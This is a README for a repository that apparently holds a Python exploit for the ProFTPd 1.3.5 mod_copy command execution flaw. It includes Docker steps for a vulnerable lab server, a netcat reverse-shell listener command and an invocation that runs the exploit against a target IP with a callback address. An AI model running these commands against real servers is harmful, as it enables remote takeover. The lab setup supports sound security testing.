# ProFTPd 1.3.5 mod_copy Exploit

If you prefere using Metasploit, just use the excellent
working [ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)"](https://www.exploit-db.com/exploits/37262)

There is a Python version in Exploit db
[ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution](https://www.exploit-db.com/exploits/36803)
but at the time of writting I did not manage to get that running. This code follows the way the Metasploit
exploit works. As this is just counted as a conversion from one language to another it was not accepted
by Exploit-db.

## Python3

Thanks to [Nimbusshub](https://github.com/Nimbusshub) who updated this script to Python3.

## Docker

For an easy way to test this script, I have added some Docker files to run ProFTP 1.3.5 with the mod_copy
module installed. An Apache2 server with PHP enabled is also set to run, so that a full exploit exmaple
can run, ending with a php reverse shell.

Build and run the server with:

```
docker build -t proftp .
docker run -p 80:80 -p 21:21 --rm -it proftp
```

You can find the docker server :wIP with:

```
docker ps    #to get the Container ID
docker inpect <CONTAINER_ID>
```

Then set up your reverse shell listener e.g.

```
nc -nvlp 8888
```

Finally run the exploit e.g.

```
python3 exploit_proftd_1_3_5.py 172.17.0.2 /var/www/html 192.168.1.84 8888
```
